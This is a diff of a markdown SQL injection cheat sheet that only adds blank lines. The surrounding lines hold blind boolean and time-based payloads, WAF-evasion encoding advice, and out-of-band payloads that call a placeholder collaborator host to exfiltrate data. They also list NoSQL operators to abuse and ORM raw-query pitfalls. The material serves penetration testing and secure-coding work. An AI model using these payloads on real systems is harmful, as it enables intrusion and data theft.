@@ -28,11 +28,13 @@ Run same payload URL-encoded and double-encoded in separate runs to defeat WAF.
 ## Blind techniques
 
 **Boolean-based:**
+
 ```
 1 AND (SELECT SUBSTR(username,1,1) FROM users WHERE id=1)='a'
 ```
 
 **Time-based:**
+
 ```
 MySQL:    SLEEP(5)
 MSSQL:    WAITFOR DELAY '0:0:5'
@@ -42,6 +44,7 @@ SQLite:   randomblob(100000000)  (heavy, use sparingly)
 ```
 
 **OOB (Oracle, MSSQL, Postgres):**
+
 ```
 MSSQL:    EXEC master..xp_dirtree '\\<collab>\a'
 Oracle:   UTL_HTTP.REQUEST('http://<collab>/')
@@ -71,6 +74,7 @@ Operators to abuse: `$ne`, `$gt`, `$regex`, `$where` (JS eval), `$expr`, `$looku
 ## ORM-layer
 
 Even with parameterized queries, ORMs have pitfalls:
+
 - Sequelize `literal()`, `Op.and: [sequelize.literal('..')]`.
 - SQLAlchemy `text()` without bound params.
 - Hibernate HQL with string concat.
